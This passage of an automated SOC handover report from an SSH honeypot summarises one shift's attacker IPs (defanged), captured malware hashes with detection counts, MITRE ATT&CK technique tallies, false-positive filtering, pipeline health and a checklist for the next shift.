| `101.126.22[.]12` | **10** | 2026-03-17 07:56 | 2026-03-17 08:05 | 13m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.99.80[.]40` | **10** | 2026-03-17 07:54 | 2026-03-17 08:17 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.214.209[.]153` | **10** | 2026-03-17 07:22 | 2026-03-17 07:43 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.237.94[.]18` | **10** | 2026-03-17 07:57 | 2026-03-17 08:16 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.67[.]70` | **8** | 2026-03-17 04:55 | 2026-03-17 06:01 | 8m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `183.81.33[.]183` | **8** | 2026-03-17 06:49 | 2026-03-17 08:43 | 2m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.100[.]52` | **3** | 2026-03-17 05:47 | 2026-03-17 05:51 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.131.220[.]121` | **3** | 2026-03-17 03:33 | 2026-03-17 03:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.192.39[.]35` | **2** | 2026-03-17 05:15 | 2026-03-17 05:23 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.192.39[.]39` | **2** | 2026-03-17 05:18 | 2026-03-17 05:21 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.125[.]27` | **2** | 2026-03-17 08:36 | 2026-03-17 08:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.171.8[.]42` | **2** | 2026-03-17 02:02 | 2026-03-17 02:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.78.106[.]30` | **2** | 2026-03-17 07:54 | 2026-03-17 07:54 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.242.115[.]83` | **2** | 2026-03-17 05:45 | 2026-03-17 05:51 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | **2** | 2026-03-17 02:20 | 2026-03-17 02:28 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.126.155[.]86` | 1 | 2026-03-17 05:51 | 2026-03-17 05:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.47.158[.]137` | 1 | 2026-03-17 03:53 | 2026-03-17 03:54 | 60s | 0 | `T1592` | 🟢 LOW |
| `101.71.37[.]101` | 1 | 2026-03-17 06:25 | 2026-03-17 06:25 | 11s | 0 | `T1592` | 🟢 LOW |
| `103.192.39[.]34` | 1 | 2026-03-17 05:10 | 2026-03-17 05:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.192.39[.]38` | 1 | 2026-03-17 05:08 | 2026-03-17 05:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.192.39[.]40` | 1 | 2026-03-17 05:02 | 2026-03-17 05:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.192.39[.]41` | 1 | 2026-03-17 04:59 | 2026-03-17 04:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.192.39[.]42` | 1 | 2026-03-17 05:13 | 2026-03-17 05:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.192.39[.]43` | 1 | 2026-03-17 05:05 | 2026-03-17 05:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.56.30[.]33` | 1 | 2026-03-17 05:00 | 2026-03-17 05:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.93.37[.]178` | 1 | 2026-03-17 08:21 | 2026-03-17 08:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.246.89[.]68` | 1 | 2026-03-17 01:16 | 2026-03-17 01:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.227.112[.]35` | 1 | 2026-03-17 04:58 | 2026-03-17 04:58 | 13s | 0 | `T1592` | 🟢 LOW |
| `109.67.161[.]37` | 1 | 2026-03-17 03:46 | 2026-03-17 03:46 | 12s | 0 | `T1592` | 🟢 LOW |
| `111.70.32[.]2` | 1 | 2026-03-17 05:31 | 2026-03-17 05:31 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.26.101[.]76` | 1 | 2026-03-17 00:51 | 2026-03-17 00:51 | 16s | 0 | `T1592` | 🟢 LOW |
| `118.163.178[.]146` | 1 | 2026-03-17 02:49 | 2026-03-17 02:50 | 118s | 0 | `T1592` | 🟢 LOW |
| `120.196.66[.]80` | 1 | 2026-03-17 06:29 | 2026-03-17 06:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.198.138[.]185` | 1 | 2026-03-17 02:37 | 2026-03-17 02:37 | 5s | 0 | `T1592` | 🟢 LOW |
| `120.203.25[.]201` | 1 | 2026-03-17 01:27 | 2026-03-17 01:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-03-17 03:41 | 2026-03-17 03:42 | 62s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.109[.]59` | 1 | 2026-03-17 03:04 | 2026-03-17 03:04 | 5s | 0 | `T1592` | 🟢 LOW |
| `124.129.157[.]189` | 1 | 2026-03-17 05:25 | 2026-03-17 05:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.227.193[.]21` | 1 | 2026-03-17 08:28 | 2026-03-17 08:28 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]233` | 1 | 2026-03-17 04:59 | 2026-03-17 05:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `151.42.177[.]4` | 1 | 2026-03-17 00:11 | 2026-03-17 00:11 | 14s | 0 | `T1592` | 🟢 LOW |
| `165.227.54[.]132` | 1 | 2026-03-17 04:50 | 2026-03-17 04:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.174.5[.]146` | 1 | 2026-03-17 06:24 | 2026-03-17 06:24 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.166.162[.]78` | 1 | 2026-03-17 06:30 | 2026-03-17 06:30 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.167.96[.]50` | 1 | 2026-03-17 06:57 | 2026-03-17 06:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.52.51[.]123` | 1 | 2026-03-17 02:19 | 2026-03-17 02:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `197.156.97[.]198` | 1 | 2026-03-17 02:55 | 2026-03-17 02:55 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.219.210[.]46` | 1 | 2026-03-17 04:51 | 2026-03-17 04:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.126[.]88` | 1 | 2026-03-17 08:47 | 2026-03-17 08:47 | 7s | 0 | `T1592` | 🟢 LOW |
| `2.55.69[.]224` | 1 | 2026-03-17 05:21 | 2026-03-17 05:21 | 7s | 0 | `T1592` | 🟢 LOW |
| `204.216.190[.]165` | 1 | 2026-03-17 04:03 | 2026-03-17 04:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `206.168.34[.]118` | 1 | 2026-03-17 07:20 | 2026-03-17 07:20 | 25s | 0 | `T1592` | 🟢 LOW |
| `219.89.198[.]191` | 1 | 2026-03-17 07:04 | 2026-03-17 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.130.203[.]68` | 1 | 2026-03-17 01:22 | 2026-03-17 01:23 | 30s | 0 | `T1592` | 🟢 LOW |
| `223.197.145[.]126` | 1 | 2026-03-17 04:32 | 2026-03-17 04:32 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `24.163.114[.]60` | 1 | 2026-03-17 00:02 | 2026-03-17 00:02 | 30s | 0 | `T1592` | 🟢 LOW |
| `27.223.98[.]117` | 1 | 2026-03-17 02:44 | 2026-03-17 02:45 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.55.159[.]23` | 1 | 2026-03-17 05:53 | 2026-03-17 05:54 | 15s | 0 | `T1592` | 🟢 LOW |
| `41.216.177[.]55` | 1 | 2026-03-17 04:59 | 2026-03-17 04:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.118.49[.]18` | 1 | 2026-03-17 05:02 | 2026-03-17 05:02 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.152[.]220` | 1 | 2026-03-17 08:09 | 2026-03-17 08:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `61.106.81[.]21` | 1 | 2026-03-17 00:43 | 2026-03-17 00:43 | 12s | 0 | `T1592` | 🟢 LOW |
| `61.219.63[.]79` | 1 | 2026-03-17 07:12 | 2026-03-17 07:12 | 16s | 0 | `T1592` | 🟢 LOW |
| `8.222.210[.]184` | 1 | 2026-03-17 04:37 | 2026-03-17 04:37 | 30s | 0 | `T1592` | 🟢 LOW |
| `80.233.12[.]109` | 1 | 2026-03-17 07:38 | 2026-03-17 07:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.159.3[.]114` | 1 | 2026-03-17 05:41 | 2026-03-17 05:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **26/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `181.49.3[.]38` | CO | Telmex Colombia S.A. | **100** ⚠️ | 11 |
| `197.219.210[.]46` | MZ | Movitel, SA | **100** ⚠️ | 12 |
| `165.227.54[.]132` | US | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `124.129.157[.]189` | CN | China Unicom Shandong province network | **100** ⚠️ | 26 |
| `41.242.115[.]83` | GH | DOLPHIN TELECOMMUNICATION LIMITED | **100** ⚠️ | 50 |
| `118.163.178[.]146` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 50 |
| `103.192.39[.]34` | HK | LCX International Technology Co.,Limited | **100** ⚠️ | 11 |
| `106.246.89[.]68` | KR | LG DACOM Corporation | **100** ⚠️ | 20 |
| `103.192.39[.]42` | HK | LCX International Technology Co.,Limited | **100** ⚠️ | 4 |
| `109.227.112[.]35` | UA | McLaut network | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 401 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 262 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 96 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |

---

## 🔕 False Positive Summary (300 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 4 |
| AbuseIPDB score 13 below threshold 25 | 4 |
| AbuseIPDB score 15 below threshold 25 | 39 |
| AbuseIPDB score 16 below threshold 25 | 26 |
| AbuseIPDB score 19 below threshold 25 | 10 |
| AbuseIPDB score 5 below threshold 25 | 15 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 197 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 551 cases |
| Tool 34  | Credential Extractor        | ✅ 358 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 0 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 116 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 300 filtered (54.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 65 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 79 priority case(s) shown individually · 69 recon entry/entries in table (18 group(s) consolidating 121 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-17T08:52:40Z_
